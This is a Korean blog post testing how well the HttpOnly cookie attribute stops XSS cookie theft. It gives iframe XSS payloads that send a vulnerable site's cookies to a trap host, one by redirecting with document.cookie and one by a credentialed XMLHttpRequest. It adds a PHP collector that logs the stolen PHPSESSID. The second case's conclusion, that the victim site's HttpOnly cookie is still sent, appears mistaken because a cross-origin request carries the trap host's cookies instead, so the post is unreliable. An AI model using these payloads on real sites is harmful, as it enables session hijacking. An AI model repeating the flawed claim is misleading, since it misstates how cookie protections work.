---
layout: post
title: "httponly 속성이 XSS를 어느정도 방어하는 알아보기"
categories: [웹보안]
tags: [웹보안, httponly, XSS]
toc: true
last_modified_at: 2024-02-22 17:02:00 +0900
---

# 개요
- 쿠키에 `httponly` 속성이 있으면 XSS 공격에 대해서 어떻게 보험적인 방어책이 되나 정리한다. 
- 이 속성이 있으면 Javascript로는 쿠키에 접근할 수 없기 때문에 어느정도 XSS방어가 될 것 같지만 구체적으로 어떤 시나리오에 대해서 방어가 되고, 어떤 시나리에서는 방어가 안되는지를 정리해둔다. 


# 케이스 1
- 어떤 사이트에 XSS 취약점이 있어서 임의의 자바스크립트를 실행시키는게 가능하다. victim을 함정사이트에 유도한다. 이 함정사이트에는 iframe으로 취약한 사이트에서 자바스크립트를 실행하여 해당 사이트를 쿠키에 접근해 함정사이트로 그 값을 전송하는 코드가 있다. 예를들어 다음과 같다. 취약한 사이트의 쿠키 값에 접근할 때 `document.cookie`라는 자바스크립트 코드로 접근하고 있다. 

```html
<html><body>
염가 상품 정보
<br><br>
<iframe width=320 height=100 src="http://XSS가존재하는취약한사이트URL?keyword=<script>window.location='http://함정사이트URL?sid='%2Bdocument.cookie;</script>"></iframe>
</body></html>

```

- 이런 경우는 `httponly` 속성이 있으면 접근하지 못하기 때문에 적절한 방어책이 된다. 

# 케이스 2
- 어떤 사이트에 XSS 취약점이 있어서 임의의 자바스크립트를 실행시키는게 가능하다. 자바스크립트의 XMLHttpRequest나 fetch API 를 사용해서 취약점이 있는 사이트의 쿠키를 공격자의 서버로 전송한다. 

```html
<iframe width=500 height=300 src="http://XSS가존재하는취약한사이트URL?keyword=<script>var xhr = new XMLHttpRequest();xhr.open('POST','http://함정사이트URL');xhr.withCredentials=true;xhr.send();</script>"></iframe>
```

- 이 경우는 `httponly` 속성이 있어도 전송되기 때문에 방어하지 못한다. 

## POC용 소스코드 
트랩 사이트

```html
<html><body>
싼 상품정보
<br><br>
<iframe width=500 height=300 src="http://example.jp/43/43-001.php?keyword=<script>var xhr = new XMLHttpRequest();xhr.open('POST','http://trap.example.com/43/43-xml-request-cookie-server.php');xhr.withCredentials=true;xhr.send();</script>"></iframe>
</body></html>

```

공격자 서버

```php
<?php
  session_start();
  error_log('[XML Request Cookie Collect Server]!!!');
  // CORS 헤더가 있던 없던 송신된다.
  //header('Access-Control-Allow-Origin: http://example.jp');
  //header('Access-Control-Allow-Credentials: true');
  $sid = $_COOKIE["PHPSESSID"];
  error_log($sid);
  // // echo session_id();
  // $myfile = fopen("phpsessids.txt", "a")
  // fwrite($myfile, $sid + "\n");
  // fclose($myfile);
?>
</body>

```